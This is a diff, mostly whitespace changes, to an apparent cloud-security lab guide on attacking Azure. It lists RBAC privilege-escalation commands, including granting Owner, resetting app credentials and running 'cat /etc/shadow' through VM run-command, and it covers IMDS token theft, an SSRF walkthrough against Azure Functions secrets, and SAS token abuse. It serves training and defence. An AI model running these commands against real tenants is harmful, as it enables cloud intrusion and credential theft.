@@ -75,18 +75,19 @@ ls -la
 ## Attack Vector 1: Azure Entra ID (Azure AD) RBAC Privilege Escalation
 
 In Azure, administrative access is governed by two distinct planes:
+
 1. **Directory Roles (Entra ID)**: Global Administrator, Privileged Role Administrator, User Administrator.
 2. **Resource Roles (ARM RBAC)**: Owner, Contributor, User Access Administrator.
 
 ### Dangerous RBAC Roles & Escalation Vectors
 
-| Role / Permission | Vulnerability Mechanism | Exploitation Command |
-|:---|:---|:---|
-| **`User Access Administrator`** | Can grant arbitrary RBAC roles to any identity | `az role assignment create --assignee <self> --role "Owner" --scope /subscriptions/<sub-id>` |
-| **`Contributor` on VM / Function** | Can execute arbitrary code as root/SYSTEM on compute resources holding Managed Identities | `az vm run-command invoke --command-id RunShellScript --scripts "cat /etc/shadow"` |
-| **`Application.ReadWrite.All`** | Can add client secrets or certificates to any existing enterprise application | `az ad app credential reset --id <target-app-id> --append` |
-| **`RoleManagement.ReadWrite.Directory`** | Can grant Global Administrator role to any principal in Entra ID | Use Microsoft Graph API to assign directory role `62e90394-69f5-4237-9190-012177145e10` |
-| **`Group.ReadWrite.All`** | Can add arbitrary users into privileged groups (e.g. "Cloud Admins") | `az ad group member add --group "Cloud Admins" --member-id <attacker-object-id>` |
+| Role / Permission                        | Vulnerability Mechanism                                                                   | Exploitation Command                                                                         |
+| :--------------------------------------- | :---------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------- |
+| **`User Access Administrator`**          | Can grant arbitrary RBAC roles to any identity                                            | `az role assignment create --assignee <self> --role "Owner" --scope /subscriptions/<sub-id>` |
+| **`Contributor` on VM / Function**       | Can execute arbitrary code as root/SYSTEM on compute resources holding Managed Identities | `az vm run-command invoke --command-id RunShellScript --scripts "cat /etc/shadow"`           |
+| **`Application.ReadWrite.All`**          | Can add client secrets or certificates to any existing enterprise application             | `az ad app credential reset --id <target-app-id> --append`                                   |
+| **`RoleManagement.ReadWrite.Directory`** | Can grant Global Administrator role to any principal in Entra ID                          | Use Microsoft Graph API to assign directory role `62e90394-69f5-4237-9190-012177145e10`      |
+| **`Group.ReadWrite.All`**                | Can add arbitrary users into privileged groups (e.g. "Cloud Admins")                      | `az ad group member add --group "Cloud Admins" --member-id <attacker-object-id>`             |
 
 ### Hands-On Exploitation: Abusing App Registrations to Escalate Privileges
 
@@ -122,10 +123,12 @@ az group list -o table
 ## Attack Vector 2: Azure Managed Identity Token Theft via IMDS
 
 ### System-Assigned vs. User-Assigned Identities
+
 - **System-Assigned**: Tied directly to the lifecycle of a specific Azure resource (VM, App Service, Azure Function). Automatically created and destroyed with the resource.
 - **User-Assigned**: Standalone identity created as an independent Azure resource that can be assigned to multiple VMs or functions.
 
 ### The Azure Instance Metadata Service (IMDS)
+
 Azure compute resources can query IMDS at `http://169.254.169.254/` to obtain OAuth2 access tokens from Microsoft Entra ID without embedding credentials in code:
 
 ```
@@ -172,7 +175,9 @@ curl -s -H "Authorization: Bearer $AZURE_TOKEN" \
 ```
 
 ### Acquiring Tokens for Key Vault or Azure Storage
+
 Tokens must be requested for specific audiences (`resource` parameter):
+
 - **Key Vault**: `resource=https://vault.azure.net`
 - **Azure Storage**: `resource=https://storage.azure.com/`
 - **Microsoft Graph**: `resource=https://graph.microsoft.com/`
@@ -182,14 +187,17 @@ Tokens must be requested for specific audiences (`resource` parameter):
 ## Attack Vector 3: Azure Functions SSRF & Internal Cloud Exfiltration
 
 ### Threat Model: Serverless Pivoting
+
 Azure Functions that process user-supplied URLs (e.g., PDF converters, webhooks, URL previewers) are prime targets for Serverless SSRF.
 
 In addition to IMDS, Azure Functions host environment variables containing sensitive infrastructure secrets:
+
 - `APPINSIGHTS_INSTRUMENTATIONKEY`
 - `AzureWebJobsStorage` (contains full storage connection string with master account key!)
 - `WEBSITE_AUTH_SIGNING_KEY`
 
 ### Exploitation Walkthrough
+
 1. **Inject SSRF Payload**:
    ```http
    POST /api/HttpTrigger1 HTTP/1.1
@@ -208,11 +216,13 @@ In addition to IMDS, Azure Functions host environment variables containing sensi
 ## Attack Vector 4: Azure Blob Storage SAS Token Abuse
 
 ### Anatomy of a Shared Access Signature (SAS) Token
+
 A SAS URL provides delegated access to Azure Storage resources without sharing the primary Storage Account Key. A typical SAS URL looks like:
 
 `https://cyberlabstorage.blob.core.windows.net/confidential-backups/database.bak?sp=racwdl&st=2026-01-01T00:00:00Z&se=2099-12-31T23:59:59Z&spr=https&sv=2022-11-02&sr=c&sig=abcdef123456...`
 
 ### Decoded Parameters
+
 - **`sp` (Signed Permissions)**:
   - `r` = Read
   - `a` = Add
@@ -292,6 +302,7 @@ All video links have been verified active via the YouTube oEmbed API (`HTTP 200 
 ---
 
 ## Quick CLI Control
+
 From the `cyber_lab` root directory:
 
 ```bash
